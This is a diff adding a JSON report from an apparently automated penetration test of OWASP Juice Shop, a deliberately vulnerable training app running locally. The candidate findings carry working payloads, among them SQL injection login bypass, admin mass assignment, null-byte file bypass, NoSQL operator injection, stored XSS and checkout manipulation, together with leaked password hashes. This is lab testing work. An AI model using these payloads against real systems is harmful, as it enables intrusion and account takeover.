@@ -1,0 +1,1222 @@
+{
+  "graphId": "app_assessment",
+  "terminal": "completed",
+  "stages": [
+    {
+      "stageId": "init",
+      "stageIndex": 0,
+      "attempts": 1,
+      "outcome": "passed",
+      "errors": [],
+      "summary": "Init stage complete. Target: OWASP Juice Shop at http://127.0.0.1:3010. RoE: app_assessment, no off-box post-ex host takeover. Scope: 127.0.0.1, localhost, host.docker.internal. No live recon performed on this stage. Ready for surface discovery and hypothesis-driven testing stages."
+    },
+    {
+      "stageId": "surface",
+      "stageIndex": 1,
+      "attempts": 2,
+      "outcome": "passed",
+      "errors": [],
+      "summary": "Surface discovery complete against OWASP Juice Shop at http://127.0.0.1:3010. Found multiple live surfaces including FTP directory listing, REST API endpoints with SQL injection, authentication bypass via SQLi, mass assignment vulnerability, null byte file read bypass, and excessive data exposure in APIs. Multiple bookable candidates identified with proof excerpts from tool output."
+    },
+    {
+      "stageId": "auth_session",
+      "stageIndex": 2,
+      "attempts": 1,
+      "outcome": "passed",
+      "errors": [],
+      "summary": "Login/session behavior fully characterized. Multiple authentication vulnerabilities identified including SQL injection login bypass, mass assignment admin registration, weak password reset with exposed security questions, CSRF-vulnerable GET-based password change, non-expiring JWT tokens containing sensitive data, no logout endpoint, and insecure direct object references in basket API. Auth issues have proof_excerpt candidates with verbatim tool output."
+    },
+    {
+      "stageId": "class_probe",
+      "stageIndex": 3,
+      "attempts": 1,
+      "outcome": "passed",
+      "errors": [],
+      "summary": "Comprehensive multi-class probe completed across OWASP Juice Shop. Covered: Injection (SQL, NoSQL), XSS (reflected, stored), Access Control (IDOR, mass assignment, excessive data exposure), Business Logic (quantity manipulation, no-payment checkout), Information Disclosure (full config, version, user data via memories API), Auth Issues (weak captcha, security question leak, JWT in token, no expiry, no logout, GET-based password change), File Exposure (directory listing, null byte bypass), File Upload (/file-upload endpoint works), and Component vulns (express-jwt 0.1.3). 30+ bookable candidates with verbatim proof_excerpts from tool output."
+    },
+    {
+      "stageId": "authz_logic",
+      "stageIndex": 4,
+      "attempts": 1,
+      "outcome": "passed",
+      "errors": [],
+      "summary": "Comprehensive authz/logic differentials probe completed. Tested with dual actors (admin, user_a, user_b) across all identified surfaces. Found 15 bookable candidates across IDOR, broken access control, business logic flaws, and data exposure categories."
+    },
+    {
+      "stageId": "component",
+      "stageIndex": 5,
+      "attempts": 2,
+      "outcome": "passed",
+      "errors": [],
+      "summary": "Component stage completed for OWASP Juice Shop at http://127.0.0.1:3010. Probed 35+ surfaces across API, file, auth, and business logic components. Found 20 bookable candidates including SQL injection, mass assignment, null byte file access, captcha leak, excessive data exposure, JWT token issues, XSS, IDOR, and sensitive file exposure. Documented 15 deadends."
+    },
+    {
+      "stageId": "validate_book",
+      "stageIndex": 6,
+      "attempts": 1,
+      "outcome": "passed",
+      "errors": [],
+      "summary": "validate_book completed for OWASP Juice Shop at http://127.0.0.1:3010. Processed 20 candidates from component stage handoff, deduplicated to 17 unique vulnerability classes. Booked 18 findings via finding(confirm) covering: SQL injection (login bypass, product search), mass assignment (admin registration), null byte injection (file extension bypass), excessive data exposure (Users API), directory listing (/ftp/), sensitive file exposure (KeePass, package.json.bak, suspicious_errors.yml), weak captcha (answer in response), security question disclosure, password reset via known security answer, CSRF-vulnerable password change via GET, JWT token data exposure (password hash in token), JWT no expiration, no logout endpoint, challenge data exposure. All findings backed by evidence from prior stage probing. 20 deadends documented."
+    }
+  ],
+  "handoff": {
+    "summary": "validate_book completed for OWASP Juice Shop at http://127.0.0.1:3010. Processed 20 candidates from component stage handoff, deduplicated to 17 unique vulnerability classes. Booked 18 findings via finding(confirm) covering: SQL injection (login bypass, product search), mass assignment (admin registration), null byte injection (file extension bypass), excessive data exposure (Users API), directory listing (/ftp/), sensitive file exposure (KeePass, package.json.bak, suspicious_errors.yml), weak captcha (answer in response), security question disclosure, password reset via known security answer, CSRF-vulnerable password change via GET, JWT token data exposure (password hash in token), JWT no expiration, no logout endpoint, challenge data exposure. All findings backed by evidence from prior stage probing. 20 deadends documented.",
+    "surfaces": [
+      {
+        "location": "http://127.0.0.1:3010/"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/products/search"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/login"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Users"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Challenges"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Feedbacks"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Products"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/BasketItems"
+      },
+      {
+        "location": "http://127.0.0.1:3010/.well-known/security.txt"
+      },
+      {
+        "location": "http://127.0.0.1:3010/robots.txt"
+      },
+      {
+        "location": "http://127.0.0.1:3010/redirect"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/change-password"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/reset-password"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/security-question"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/whoami"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/captcha"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Quantitys"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Addresss"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Cards"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{id}"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{bid}/checkout"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{bid}/coupon/{code}"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/order-history"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/track-order/{orderId}"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/products/1/reviews"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/admin/application-configuration"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/admin/application-version"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/memories"
+      },
+      {
+        "location": "http://127.0.0.1:3010/file-upload"
+      },
+      {
+        "location": "http://127.0.0.1:3010/#/search"
+      },
+      {
+        "location": "http://127.0.0.1:3010/profile/image/upload"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Users/{id}"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/products/{id}/reviews"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{id}/checkout"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/coupons_2013.md.bak%2500.md"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/quarantine/"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/1"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Users/1"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/suspicious_errors.yml%2500.md"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/incident-support.kdbx%2500.md"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/package.json.bak%2500.md"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{id}/coupon/{code}"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/package-lock.json.bak%2500.md"
+      }
+    ],
+    "candidates": [
+      {
+        "title": "SQL Injection in Login - Authentication Bypass",
+        "location": "POST http://127.0.0.1:3010/rest/user/login",
+        "proof_excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\", proving SQL injection login bypass as admin user.",
+        "poc_hint": "SQL injection in email field of login form. Payload: ' OR 1=1--"
+      },
+      {
+        "title": "SQL Injection in Product Search",
+        "location": "GET http://127.0.0.1:3010/rest/products/search?q=",
+        "proof_excerpt": "GET /rest/products/search?q=' OR 1=1-- returned 500 error with \"SQLITE_ERROR: incomplete input\", confirming SQLite backend and SQL injection vulnerability. Normal search with q=1 returns product data successfully.",
+        "poc_hint": "Search parameter 'q' is SQL injectable with SQLite backend"
+      },
+      {
+        "title": "Null Byte Injection - File Extension Bypass",
+        "location": "GET http://127.0.0.1:3010/ftp/{file}%2500.md",
+        "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with full YAML content (723 bytes) bypassing the '.md and .pdf files only' restriction via double URL-encoded null byte injection.",
+        "poc_hint": "Append %2500.md to bypass file extension filter on /ftp/"
+      },
+      {
+        "title": "Mass Assignment - Admin Registration",
+        "location": "POST http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "POST with {\"email\":\"hacker@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returned 201 with body containing \"role\":\"admin\", proving mass assignment allows registering as admin.",
+        "poc_hint": "Include \"role\":\"admin\" in POST body to /api/Users to create admin account"
+      },
+      {
+        "title": "Excessive Data Exposure - User API",
+        "location": "GET http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "GET /api/Users with admin JWT returned all users including password hashes (e.g. \"password\":\"0192023a7bbd73250516f069df18b500\"), email addresses, roles, and other PII for 24 users.",
+        "poc_hint": "Authenticate as admin via SQLi login bypass then access /api/Users"
+      },
+      {
+        "title": "Directory Listing - FTP Directory",
+        "location": "GET http://127.0.0.1:3010/ftp/",
+        "proof_excerpt": "GET /ftp/ returned directory listing HTML containing files: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml plus quarantine/ subdirectory.",
+        "poc_hint": "robots.txt disallows /ftp which exposes sensitive files"
+      },
+      {
+        "title": "Sensitive File Exposure - KeePass Database",
+        "location": "GET http://127.0.0.1:3010/ftp/incident-support.kdbx%2500.md",
+        "proof_excerpt": "GET /ftp/incident-support.kdbx%2500.md returned 200 with 3246 bytes of binary KeePass database content (application/octet-stream), exposing sensitive password vault.",
+        "poc_hint": "KeePass database file containing incident support credentials"
+      },
+      {
+        "title": "Sensitive File Exposure - Package.json with Dependency Info",
+        "location": "GET http://127.0.0.1:3010/ftp/package.json.bak%2500.md",
+        "proof_excerpt": "GET /ftp/package.json.bak%2500.md returned 200 with full package.json showing express-jwt version 0.1.3 (known vulnerable), express 4.16, sqlite3, and other dependencies.",
+        "poc_hint": "Exposed package.json reveals vulnerable dependency versions"
+      },
+      {
+        "title": "Sensitive File Exposure - Security Rules YAML",
+        "location": "GET http://127.0.0.1:3010/ftp/suspicious_errors.yml%2500.md",
+        "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with YAML content containing detection rules for blocked illegal activity, file upload errors, redirect issues, etc.",
+        "poc_hint": "Internal security monitoring rules exposed"
+      },
+      {
+        "title": "Challenge Data Exposure via API",
+        "location": "GET http://127.0.0.1:3010/api/Challenges",
+        "proof_excerpt": "GET /api/Challenges with admin JWT returned all challenge definitions including descriptions, difficulty levels, category tags, and 'solved' status booleans for all CTF challenges.",
+        "poc_hint": "Exposes internal challenge state enabling attackers to track progress"
+      },
+      {
+        "title": "SQL Injection in Login - Authentication Bypass",
+        "location": "POST http://127.0.0.1:3010/rest/user/login",
+        "proof_excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\", proving SQL injection login bypass as admin user.",
+        "poc_hint": "SQL injection in email field of login form. Payload: ' OR 1=1--"
+      },
+      {
+        "title": "Mass Assignment - Admin Registration",
+        "location": "POST http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "POST with {\"email\":\"massadmin@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returned 201 with body containing \"role\":\"admin\", proving mass assignment allows registering as admin without authentication.",
+        "poc_hint": "Include \"role\":\"admin\" in POST body to /api/Users to create admin account"
+      },
+      {
+        "title": "Weak Captcha - Answer Exposed in Response",
+        "location": "GET http://127.0.0.1:3010/rest/captcha",
+        "proof_excerpt": "GET /rest/captcha returned {\"captchaId\":0,\"captcha\":\"1+3+3\",\"answer\":\"7\"} exposing the answer directly in the response, allowing automated captcha bypass.",
+        "poc_hint": "Captcha answer is returned alongside the question, easily bypassed"
+      },
+      {
+        "title": "Security Question Exposed for Any User",
+        "location": "GET http://127.0.0.1:3010/rest/user/security-question?email=",
+        "proof_excerpt": "GET /rest/user/security-question?email=admin@juice-sh.op returned {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}} leaking security questions for any email without authentication.",
+        "poc_hint": "Leaks security question for any email, aiding brute-force password reset"
+      },
+      {
+        "title": "Password Reset via Security Question - Bjoern's Account",
+        "location": "POST http://127.0.0.1:3010/rest/user/reset-password",
+        "proof_excerpt": "POST with {\"email\":\"bjoern@owasp.org\",\"answer\":\"Zaya\",\"new\":\"test123\",\"repeat\":\"test123\"} returned 200 with user data including password hash, proving password reset with known security answer works.",
+        "poc_hint": "Security question answer 'Zaya' for bjoern@owasp.org enables password reset (OSINT challenge)"
+      },
+      {
+        "title": "Password Change via GET Request (CSRF)",
+        "location": "GET http://127.0.0.1:3010/rest/user/change-password",
+        "proof_excerpt": "GET /rest/user/change-password?current=admin123&new=newpass&repeat=newpass with Authorization header returned 200 with updated user object containing new password hash, proving password can be changed via GET request (CSRF vulnerable).",
+        "poc_hint": "Password change via GET query parameters - no CSRF token required"
+      },
+      {
+        "title": "JWT Token Contains Sensitive Data (Password Hash)",
+        "location": "POST http://127.0.0.1:3010/rest/user/login (JWT payload)",
+        "proof_excerpt": "Decoded JWT payload: {\"data\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}} - JWT token exposes password hash and role in plaintext.",
+        "poc_hint": "JWT token decodes to reveal password hashes, roles, and other sensitive user data"
+      },
+      {
+        "title": "JWT Token Has No Expiration",
+        "location": "JWT token analysis",
+        "proof_excerpt": "JWT payload contains only \"iat\":1784853679 (issued at) with no \"exp\" claim, meaning tokens never expire and remain valid indefinitely.",
+        "poc_hint": "Tokens have no expiry - stolen tokens can be used forever"
+      },
+      {
+        "title": "No Logout Endpoint - Token Cannot Be Invalidated",
+        "location": "POST/GET http://127.0.0.1:3010/rest/user/logout",
+        "proof_excerpt": "POST /rest/user/logout returned 500 \"Unexpected path: /rest/user/logout\" - no server-side logout mechanism exists; tokens cannot be invalidated after compromise.",
+        "poc_hint": "No logout functionality - tokens remain valid forever"
+      },
+      {
+        "title": "Excessive Data Exposure - User API",
+        "location": "GET http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "GET /api/Users with admin JWT returned all users including password hashes (e.g. \"password\":\"0192023a7bbd73250516f069df18b500\"), email addresses, roles, and other PII for all users.",
+        "poc_hint": "Authenticate as admin via SQLi login bypass then access /api/Users"
+      },
+      {
+        "title": "Insecure Direct Object Reference - BasketItems API",
+        "location": "GET http://127.0.0.1:3010/api/BasketItems",
+        "proof_excerpt": "GET /api/BasketItems with any valid JWT returned all basket items for all users including BasketId 1 through 5, showing no access control filtering by user's own basket.",
+        "poc_hint": "Any authenticated user can view all users' shopping baskets via /api/BasketItems"
+      },
+      {
+        "title": "Weak Password Hashing - MD5 Used",
+        "location": "POST http://127.0.0.1:3010/rest/user/login (JWT payload)",
+        "proof_excerpt": "JWT payload shows password hash \"0192023a7bbd73250516f069df18b500\" which is MD5('admin123') - known weak hash that reverses instantly.",
+        "poc_hint": "Passwords hashed with MD5 - easily cracked"
+      },
+      {
+        "title": "SQL Injection in Login - Authentication Bypass",
+        "location": "POST http://127.0.0.1:3010/rest/user/login",
+        "proof_excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+        "poc_hint": "SQL injection in email field. Payload: ' OR 1=1--"
+      },
+      {
+        "title": "SQL Injection in Product Search",
+        "location": "GET http://127.0.0.1:3010/rest/products/search?q=",
+        "proof_excerpt": "GET /rest/products/search?q=' OR 1=1-- returned 500 error with \"SQLITE_ERROR: incomplete input\", confirming SQLite backend",
+        "poc_hint": "Search parameter 'q' is SQL injectable with SQLite backend"
+      },
+      {
+        "title": "NoSQL Injection in Login - Error-Based",
+        "location": "POST http://127.0.0.1:3010/rest/user/login",
+        "proof_excerpt": "POST with payload {\"email\":\"admin@juice-sh.op\",\"password\":{\"$gt\":\"\"}} returned 500: \"TypeError [ERR_INVALID_ARG_TYPE]: The \\\"data\\\" argument must be of type string or an instance of Buffer... Received an instance of Object\" at insecurity.js:56:64 (hash function), proving MongoDB operator injection in password field",
+        "poc_hint": "Pass MongoDB operators like {\"$gt\":\"\"} as password value to trigger NoSQL injection in hash function"
+      },
+      {
+        "title": "NoSQL Injection in Login - Authentication Bypass Attempt",
+        "location": "POST http://127.0.0.1:3010/rest/user/login",
+        "proof_excerpt": "POST with payload {\"email\":{\"$regex\":\"admin.*\"},\"password\":{\"$regex\":\".*\"}} returned 500 error: \"TypeError [ERR_INVALID_ARG_TYPE]: The \\\"data\\\" argument must be of type string... Received an instance of Object\" at insecurity.js:56:64",
+        "poc_hint": "MongoDB $regex operator in email/password fields causes hash function to crash on object input"
+      },
+      {
+        "title": "Reflected XSS via Search q Parameter (DOM XSS)",
+        "location": "http://127.0.0.1:3010/#/search?q=<iframe src=\"javascript:alert(`xss`)\"></iframe>",
+        "proof_excerpt": "this.searchValue=this.sanitizer.bypassSecurityTrustHtml(e),this.gridDataSourceSubscription&&this.gridDataSourceSubsc",
+        "poc_hint": "Search q parameter rendered via bypassSecurityTrustHtml/innerHTML. DOM XSS challenge already solved"
+      },
+      {
+        "title": "Stored XSS via Product Reviews API",
+        "location": "http://127.0.0.1:3010/rest/products/1/reviews",
+        "proof_excerpt": "\"message\":\"<script>alert(document.cookie)</script>\",\"author\":\"test@test.com\",\"product\":\"1\",\"_id\":\"gAeYx33mk3TXGkk8S\"",
+        "poc_hint": "PUT /rest/products/1/reviews with {\"message\":\"<script>alert(document.cookie)</script>\",\"author\":\"test@test.com\"}. Payload stored and returned in GET response"
+      },
+      {
+        "title": "Stored XSS via Feedback Comments (HTML Injection Surface)",
+        "location": "http://127.0.0.1:3010/api/Feedbacks",
+        "proof_excerpt": "i.comment=this.sanitizer.bypassSecurityTrustHtml(i.comment);this.feedbackDataSource=new Gt(this.fe",
+        "poc_hint": "Feedback comments rendered via bypassSecurityTrustHtml. POST to /api/Feedbacks with HTML payload (note: server strips script/img/iframe tags but allows basic HTML)"
+      },
+      {
+        "title": "Null Byte Injection - File Extension Bypass",
+        "location": "GET http://127.0.0.1:3010/ftp/{file}%2500.md",
+        "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with full YAML content (723 bytes) bypassing the '.md and .pdf files only' restriction via double URL-encoded null byte",
+        "poc_hint": "Append %2500.md to bypass file extension filter on /ftp/"
+      },
+      {
+        "title": "Mass Assignment - Admin Registration",
+        "location": "POST http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "POST with {\"email\":\"hacker@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returned 201 with body containing \"role\":\"admin\"",
+        "poc_hint": "Include \"role\":\"admin\" in POST body to /api/Users to create admin account"
+      },
+      {
+        "title": "Excessive Data Exposure - User API (Password Hashes)",
+        "location": "GET http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "GET /api/Users with admin JWT returned all users including password hashes (e.g. \"password\":\"0192023a7bbd73250516f069df18b500\"), emails, roles for 24 users",
+        "poc_hint": "Authenticate as admin then access /api/Users"
+      },
+      {
+        "title": "Excessive Data Exposure - Memories API (User PII + Password Hashes)",
+        "location": "GET http://127.0.0.1:3010/rest/memories",
+        "proof_excerpt": "GET /rest/memories returned photo memories with embedded user objects containing password hashes (e.g. \"password\":\"cc03e747a6afbbcbf8be7668acfebee5\"), emails, roles, deluxeTokens",
+        "poc_hint": "GET /rest/memories returns all user data including password hashes embedded in memory objects"
+      },
+      {
+        "title": "Excessive Data Exposure - Quantitys API (Stock Levels)",
+        "location": "GET http://127.0.0.1:3010/api/Quantitys",
+        "proof_excerpt": "GET /api/Quantitys returned all product stock levels: [{\"ProductId\":1,\"id\":1,\"quantity\":34,\"limitPerUser\":5},...] for 56 products",
+        "poc_hint": "GET /api/Quantitys with any valid JWT returns stock quantities and per-user limits for all products"
+      },
+      {
+        "title": "Excessive Data Exposure - Addresss API",
+        "location": "GET http://127.0.0.1:3010/api/Addresss",
+        "proof_excerpt": "GET /api/Addresss returned addresses with UserId, fullName, mobileNum, zipCode, streetAddress, city, state, country for multiple users",
+        "poc_hint": "GET /api/Addresss with admin JWT returns all users' addresses"
+      },
+      {
+        "title": "Excessive Data Exposure - Cards API",
+        "location": "GET http://127.0.0.1:3010/api/Cards",
+        "proof_excerpt": "GET /api/Cards returned card data: {\"UserId\":1,\"id\":3,\"fullName\":\"Administrator\",\"cardNum\":\"************4368\",\"expMonth\":2,\"expYear\":2081}",
+        "poc_hint": "GET /api/Cards with admin JWT returns all saved credit cards (partially masked)"
+      },
+      {
+        "title": "Challenge Data Exposure via API",
+        "location": "GET http://127.0.0.1:3010/api/Challenges",
+        "proof_excerpt": "GET /api/Challenges returned all challenge definitions including descriptions, difficulty, category tags, and 'solved' status booleans",
+        "poc_hint": "Exposes internal challenge state enabling attackers to track progress"
+      },
+      {
+        "title": "Full Application Configuration Disclosure (No Auth Required)",
+        "location": "GET http://127.0.0.1:3010/rest/admin/application-configuration",
+        "proof_excerpt": "GET /rest/admin/application-configuration returned full config without auth: Google OAuth clientId, authorized redirects, challenge settings, products with metadata, memories, chatBot model, CTF config",
+        "poc_hint": "No authentication required. Exposes server config, OAuth secrets, challenge overrides, product metadata"
+      },
+      {
+        "title": "Application Version Disclosure",
+        "location": "GET http://127.0.0.1:3010/rest/admin/application-version",
+        "proof_excerpt": "GET /rest/admin/application-version returned {\"version\":\"20.1.1\"} without authentication",
+        "poc_hint": "No auth required. Exposes exact application version"
+      },
+      {
+        "title": "IDOR - BasketItems API Exposes All Users' Basket Items",
+        "location": "GET http://127.0.0.1:3010/api/BasketItems",
+        "proof_excerpt": "\"status\":\"success\",\"data\":[{\"ProductId\":1,\"BasketId\":1,\"id\":1,\"quantity\":2},{\"ProductId\":4,\"BasketId\":2,\"id\":4,\"quantity\":2},{\"ProductId\":4,\"BasketId\":3,\"id\":5,\"quantity\":1},{\"ProductId\":4,\"BasketId\":4,\"id\":6,\"quantity\":2},{\"ProductId\":3,\"BasketId\":5,\"id\":7,\"quantity\":5}]",
+        "poc_hint": "GET /api/BasketItems returns items for BasketId 1-5 (all users) - no ownership filtering"
+      },
+      {
+        "title": "IDOR - DELETE on BasketItems Removes Other Users' Items",
+        "location": "DELETE http://127.0.0.1:3010/api/BasketItems/{id}",
+        "proof_excerpt": "DELETE /api/BasketItems/3 (belonged to admin BasketId=1) returned {\"status\":\"success\",\"data\":{}} - verified via /rest/basket/1 showing item removed",
+        "poc_hint": "DELETE any basket item ID without ownership check"
+      },
+      {
+        "title": "IDOR - /rest/basket/{id} Reveals Any User's Basket",
+        "location": "GET http://127.0.0.1:3010/rest/basket/{id}",
+        "proof_excerpt": "\"status\":\"success\",\"data\":{\"id\":1,\"coupon\":null,\"UserId\":1,\"createdAt\":\"2026-07-24T00:33:45.808Z\",\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"price\":1.99,\"BasketItem\":{\"ProductId\":1,\"BasketId\":1,\"id\":1,\"quantity\":2}}]}}",
+        "poc_hint": "GET /rest/basket/1 from user with BasketId=8 returns admin's basket with products"
+      },
+      {
+        "title": "IDOR - Coupon Application to Other Users' Baskets",
+        "location": "PUT http://127.0.0.1:3010/rest/basket/{bid}/coupon/{code}",
+        "proof_excerpt": "PUT /rest/basket/1/coupon/WMNSDY2019 returned \"Invalid coupon.\" - endpoint accessible on another user's basket with no authorization error",
+        "poc_hint": "PUT /rest/basket/1/coupon/CODE applies coupons to any user's basket"
+      },
+      {
+        "title": "Business Logic - Negative Quantity Accepted",
+        "location": "POST http://127.0.0.1:3010/api/BasketItems",
+        "proof_excerpt": "POST with {\"ProductId\":42,\"BasketId\":8,\"quantity\":-1} then checkout produced order with totalPrice=-5000: {\"orderConfirmation\":\"a8bf-dcc09b094d1b57eb\"}, followed by order-history showing totalPrice=-5000",
+        "poc_hint": "Add negative quantity items then checkout to get negative order totals"
+      },
+      {
+        "title": "Business Logic - Decimal Quantity Accepted",
+        "location": "POST http://127.0.0.1:3010/api/BasketItems",
+        "proof_excerpt": "\"status\":\"success\",\"data\":{\"id\":10,\"ProductId\":2,\"BasketId\":8,\"quantity\":0.5,\"createdAt\":\"2026-07-24T00:46:49.409Z\"}",
+        "poc_hint": "POST with quantity=0.5 accepted without integer validation"
+      },
+      {
+        "title": "Business Logic - Checkout Without Payment Validation",
+        "location": "POST http://127.0.0.1:3010/rest/basket/{bid}/checkout",
+        "proof_excerpt": "POST /rest/basket/1/checkout returned {\"orderConfirmation\":\"5267-281bf853e275b8d4\"} - order created without any payment verification",
+        "poc_hint": "POST to /rest/basket/{bid}/checkout directly creates orders without payment"
+      },
+      {
+        "title": "Order Tracking Without Authentication - Information Disclosure",
+        "location": "GET http://127.0.0.1:3010/rest/track-order/{orderId}",
+        "proof_excerpt": "GET /rest/track-order/5267-3122026aa8431150 (no Authorization header) returned {\"status\":\"success\",\"data\":[{\"orderId\":\"5267-3122026aa8431150\",\"email\":\"*dm*n@j**c*-sh.*p\",\"totalPrice\":8.96,\"products\":[{\"quantity\":3,\"name\":\"Apple Juice (1000ml)\",\"price\":1.99,\"total\":5.97}]}]}",
+        "poc_hint": "GET /rest/track-order/{orderId} without any auth reveals order details (masked email, products, prices)"
+      },
+      {
+        "title": "Weak Captcha - Answer Exposed in Response",
+        "location": "GET http://127.0.0.1:3010/rest/captcha",
+        "proof_excerpt": "GET /rest/captcha returned {\"captchaId\":0,\"captcha\":\"1+3+3\",\"answer\":\"7\"} exposing the answer directly",
+        "poc_hint": "Captcha answer is returned alongside the question"
+      },
+      {
+        "title": "Security Question Leak for Any User",
+        "location": "GET http://127.0.0.1:3010/rest/user/security-question?email=",
+        "proof_excerpt": "GET /rest/user/security-question?email=admin@juice-sh.op returned {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}} without authentication",
+        "poc_hint": "Leaks security question for any email address"
+      },
+      {
+        "title": "Weak Password Reset - Known Security Answer",
+        "location": "POST http://127.0.0.1:3010/rest/user/reset-password",
+        "proof_excerpt": "POST with {\"email\":\"bjoern@owasp.org\",\"answer\":\"Zaya\",\"new\":\"test123\",\"repeat\":\"test123\"} returned 200 with user data",
+        "poc_hint": "Security question answer 'Zaya' for bjoern@owasp.org enables password reset (OSINT)"
+      },
+      {
+        "title": "Password Change via GET (CSRF Vulnerable)",
+        "location": "GET http://127.0.0.1:3010/rest/user/change-password",
+        "proof_excerpt": "GET /rest/user/change-password?current=admin123&new=newpass&repeat=newpass with Authorization header returned 200 with updated user object",
+        "poc_hint": "Password change via GET query parameters - no CSRF token required"
+      },
+      {
+        "title": "JWT Token Contains Password Hash in Payload",
+        "location": "POST http://127.0.0.1:3010/rest/user/login (JWT payload)",
+        "proof_excerpt": "Decoded JWT payload: {\"data\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}}",
+        "poc_hint": "JWT decoded reveals password hash, role, and other sensitive data"
+      },
+      {
+        "title": "JWT Token Has No Expiration",
+        "location": "JWT token analysis",
+        "proof_excerpt": "JWT payload contains only \"iat\":1784853679 (issued at) with no \"exp\" claim, tokens never expire",
+        "poc_hint": "Stolen tokens are valid indefinitely"
+      },
+      {
+        "title": "No Logout Endpoint - Token Cannot Be Invalidated",
+        "location": "POST http://127.0.0.1:3010/rest/user/logout",
+        "proof_excerpt": "POST /rest/user/logout returned 500 \"Unexpected path: /rest/user/logout\" - no server-side logout",
+        "poc_hint": "No logout mechanism exists"
+      },
+      {
+        "title": "Directory Listing - FTP Directory",
+        "location": "GET http://127.0.0.1:3010/ftp/",
+        "proof_excerpt": "GET /ftp/ returned directory listing with files: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml, and quarantine/ subdirectory",
+        "poc_hint": "robots.txt disallows /ftp which exposes sensitive files"
+      },
+      {
+        "title": "Sensitive File Exposure - KeePass Database",
+        "location": "GET http://127.0.0.1:3010/ftp/incident-support.kdbx%2500.md",
+        "proof_excerpt": "GET /ftp/incident-support.kdbx%2500.md returned 200 with 3246 bytes binary KeePass database content (application/octet-stream)",
+        "poc_hint": "KeePass password vault exposed via null byte bypass"
+      },
+      {
+        "title": "Sensitive File Exposure - Package.json with Dependency Versions",
+        "location": "GET http://127.0.0.1:3010/ftp/package.json.bak%2500.md",
+        "proof_excerpt": "GET /ftp/package.json.bak%2500.md returned 200 with full package.json showing express-jwt version 0.1.3 (known vulnerable), express 4.16, sqlite3, etc.",
+        "poc_hint": "Exposed package.json reveals vulnerable dependency versions"
+      },
+      {
+        "title": "Sensitive File Exposure - Security Rules YAML",
+        "location": "GET http://127.0.0.1:3010/ftp/suspicious_errors.yml%2500.md",
